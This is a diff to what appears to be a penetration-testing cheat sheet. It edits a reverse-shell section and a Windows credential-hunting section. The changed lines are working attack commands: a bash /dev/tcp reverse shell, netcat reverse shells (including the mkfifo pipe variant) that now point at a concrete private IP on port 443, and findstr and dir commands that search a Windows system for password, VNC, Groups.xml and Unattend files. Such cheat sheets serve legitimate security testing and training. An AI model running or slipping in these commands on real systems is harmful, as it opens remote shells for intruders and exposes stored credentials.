@@ -892,10 +892,10 @@ bash -i >& /dev/tcp/LISTEN_IP/LISTEN_PORT 0>&1
 
 ```sh
 # if netcat has the -e flag:
-nc -e /bin/sh 10.0.0.1 443
+nc -e /bin/sh 192.168.119.144 443
 
 # if no -e flag:
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 443 >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.144 443 >/tmp/f
 ```
 
 ### 4.4.7. Socat Reverse Shell
@@ -2097,13 +2097,15 @@ Encrypted passwords can often be recovered with tools like [NirSoft](http://www.
 
 ```bat
 :: search specific filetypes for "password"
-findstr /si password *.txt|*.xml|*.ini|*.config
+findstr /spin password *.txt *.xml *.ini *.config
 
 :: Searching all files (lots of output)
 findstr /spin "password" *.*
 
 :: find files that might have credentials in them
-dir c:\ /s *pass* == *cred* == *vnc.ini == *.config* == Groups.xml == sysprep.* == Unattend.*
+cd \ && dir /b /s *vnc.ini Groups.xml sysprep.* Unattend.* Unattended.*
+dir /b /s *passw* *creds* *credential*
+dir /b /s *.config *.conf *.cfg
 ```
 
 ### 7.3.2. Windows Passwords in Registry
